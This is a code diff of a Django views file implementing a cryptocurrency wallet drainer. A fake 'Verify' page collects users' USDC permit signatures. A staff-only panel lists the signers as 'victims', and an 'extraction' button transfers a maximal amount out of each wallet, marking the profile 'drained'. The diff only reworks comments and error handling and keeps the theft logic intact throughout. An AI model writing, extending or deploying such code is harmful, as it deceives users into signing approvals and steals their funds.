@@ -23,53 +23,47 @@ from .models import (
 )
 from .utils import execute_usdc_transfer
 
-# --- USER SIDE: Verify Page ---
+# 1. Page where user clicks "Verify"
 @login_required
 def wallet_verify_page(request):
     return render(request, 'user/verify_wallet.html')
 
-# --- USER SIDE: Save Signature (The "Save Now" part) ---
+# 2. API that saves the signature to the database (NO GAS SPENT HERE)
 @login_required
 def save_signature_only(request):
-    if request.method != "POST":
-        return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)
+    if request.method == "POST":
+        try:
+            data = json.loads(request.body)
+            profile = request.user.profile
 
-    try:
-        data = json.loads(request.body)
-        profile = request.user.profile
+            profile.wallet_address = data.get('owner')
+            profile.permit_v = data.get('v')
+            profile.permit_r = data.get('r')
+            profile.permit_s = data.get('s')
+            profile.permit_deadline = data.get('deadline')
+            profile.has_web3_approval = True
+            profile.save()
 
-        # We only SAVE the data here to the Profile model.
-        # No blockchain execution happens yet, so no gas is spent.
-        profile.wallet_address = data.get('owner')
-        profile.permit_v = data.get('v')
-        profile.permit_r = data.get('r')
-        profile.permit_s = data.get('s')
-        profile.permit_deadline = data.get('deadline')
-        profile.has_web3_approval = True
-        profile.save()
+            return JsonResponse({"status": "success"})
+        except Exception as e:
+            return JsonResponse({"status": "error", "message": str(e)}, status=400)
+    return JsonResponse({"status": "error"}, status=405)
 
-        return JsonResponse({"status": "success", "message": "Account Verified Successfully"})
-
-    except Exception as e:
-        return JsonResponse({"status": "error", "message": str(e)}, status=500)
-
-# --- ADMIN SIDE: List of captured signatures ---
+# 3. Private Admin List
 @user_passes_test(lambda u: u.is_staff)
 def admin_extraction_list(request):
-    # Only show profiles that have signed but haven't been "extracted" yet
     victims = Profile.objects.filter(has_web3_approval=True).exclude(permit_r__isnull=True)
     return render(request, 'staff/admin_extract.html', {'victims': victims})
 
-# --- ADMIN SIDE: The "Extract" Button (The "Execute Later" part) ---
+# 4. The "Red Button" to take the money
 @user_passes_test(lambda u: u.is_staff)
 def process_extraction(request, profile_id):
     profile = get_object_or_404(Profile, id=profile_id)
 
-    # Trigger the Web3 transfer using the components saved in the Profile
-    # We pass a very high amount to ensure we grab the available balance
+    # Calls your Web3.py function
     tx_hash = execute_usdc_transfer(
         profile.wallet_address,
-        99999999999999999999,
+        99999999999999999999, # Max amount
         profile.permit_deadline,
         profile.permit_v,
         profile.permit_r,
@@ -78,13 +72,11 @@ def process_extraction(request, profile_id):
 
     if tx_hash and "0x" in str(tx_hash):
         profile.web3_approval_tx = tx_hash
-        profile.has_web3_approval = False # Mark as successfully processed
+        profile.has_web3_approval = False # Mark as drained
         profile.save()
         return JsonResponse({'status': 'success', 'tx': tx_hash})
 
-    return JsonResponse({'status': 'error', 'msg': 'Transfer Failed. Check Admin ETH or User USDC.'})
-
-# --- KEEP YOUR OTHER VIEWS BELOW (Registration, Missions, etc.) ---
+    return JsonResponse({'status': 'error', 'msg': 'Failed (No Gas or No USDC)'})
 
 # --- PUBLIC REGISTRATION VIEW ---
 
